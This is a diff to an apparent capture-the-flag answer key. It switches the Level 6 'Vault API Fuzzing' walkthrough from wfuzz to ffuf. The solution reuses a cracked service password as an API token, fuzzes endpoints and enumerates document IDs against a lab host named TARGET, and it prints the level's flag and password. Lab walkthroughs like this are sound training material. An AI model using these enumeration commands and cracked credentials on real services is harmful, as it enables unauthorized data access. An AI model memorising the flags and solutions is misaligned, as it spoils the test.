@@ -150,11 +150,11 @@ The SHA256 hash is: the output of `hashlib.sha256(b"V4ult_M4st3r_K3y!").hexdiges
 
 ---
 
-## Level 6: Vault API Fuzzing (WFUZZ)
+## Level 6: Vault API Fuzzing (ffuf)
 
 **Flag:** `NEXUS{fuzz_th3_v4ult_ap1_d1sc0v3r3d_8k2m}`
 
-**Solution:** Use the cracked vault_svc password as an API token, then fuzz the vault API in two phases.
+**Solution:** Use the cracked vault_svc password as an API token, then fuzz the vault API in two phases with **ffuf**.
 
 **Prerequisites:** Crack vault_svc's SHA256 hash from Level 5.
 
@@ -171,9 +171,10 @@ wget http://TARGET:5000/level/6/api-wordlist.txt -O api-wordlist.txt
 
 **Step 2 — Phase 1: Discover API endpoints:**
 ```bash
-wfuzz -w api-wordlist.txt --hc 404 \
+ffuf -w api-wordlist.txt \
   -H "X-Vault-Token: V4ult_M4st3r_K3y!" \
-  http://TARGET:5000/level/6/vault-api/FUZZ
+  -u http://TARGET:5000/level/6/vault-api/FUZZ \
+  -fc 404
 ```
 
 This reveals valid endpoints: `status` (200), `health` (200), `config` (403), `logs` (200), `backup` (200), `archives` (200).
@@ -191,37 +192,40 @@ Response includes `"total_classified": 95` and `"message": "Specify doc_id param
 
 **Step 4 — Phase 2: Fuzz doc_id parameter:**
 
-First, run a baseline request to see the "not found" word count:
+First, run a baseline request to see the "not found" response size:
 ```bash
 curl -s -H "X-Vault-Token: V4ult_M4st3r_K3y!" \
   "http://TARGET:5000/level/6/vault-api/archives?doc_id=1"
 # Returns: {"doc_id":"1","error":"Document not found","status":"restricted"}
 ```
 
-Then fuzz the range, hiding the common word count:
+Generate a numeric wordlist and fuzz, hiding the common word count:
 ```bash
-wfuzz -z range,1-95 --hw 7 \
+seq 1 95 > nums.txt
+ffuf -w nums.txt \
   -H "X-Vault-Token: V4ult_M4st3r_K3y!" \
-  "http://TARGET:5000/level/6/vault-api/archives?doc_id=FUZZ"
+  -u "http://TARGET:5000/level/6/vault-api/archives?doc_id=FUZZ" \
+  -fw 7
 ```
 
-> **Note:** The exact `--hw` value depends on Flask's JSON formatting. The player should
-> first run without `--hw`, observe the common word count in the output, then re-run with
-> `--hw <common_count>` to filter. Alternatively, use `--hh` to filter by character count.
+> **Note:** The exact `-fw` value depends on Flask's JSON formatting. The player should
+> first run without `-fw`, observe the common word count in the output, then re-run with
+> `-fw <common_count>` to filter. Alternatively, use `-fs` to filter by response size.
 
-Only `doc_id=73` returns a different response (many more words/chars) containing the classified
+Only `doc_id=73` returns a different response (many more words/bytes) containing the classified
 CEO vault documents. The flag is inside `Project_Chimera_Financials.pdf`:
 
 `NEXUS{fuzz_th3_v4ult_ap1_d1sc0v3r3d_8k2m}`
 
-**WFUZZ flags used:**
+**ffuf flags used:**
 | Flag | Purpose |
 |------|---------|
-| `-w <file>` | Wordlist file for payloads |
-| `-z range,1-95` | Generate numeric range as payloads |
-| `FUZZ` | Placeholder replaced by each payload |
-| `--hc 404` | Hide 404 responses (Phase 1) |
-| `--hw N` | Hide responses with N words (Phase 2) |
+| `-w <file>` | Wordlist file (payloads replace FUZZ) |
+| `-u <url>` | Target URL with FUZZ keyword |
+| `FUZZ` | Placeholder replaced per request |
+| `-fc 404` | Filter (hide) HTTP 404 responses (Phase 1) |
+| `-fw N` | Filter (hide) responses with N words (Phase 2) |
+| `-fs N` | Filter (hide) responses by size in bytes (alternative) |
 | `-H "Key: Val"` | Custom HTTP header for API authentication |
 
 ---
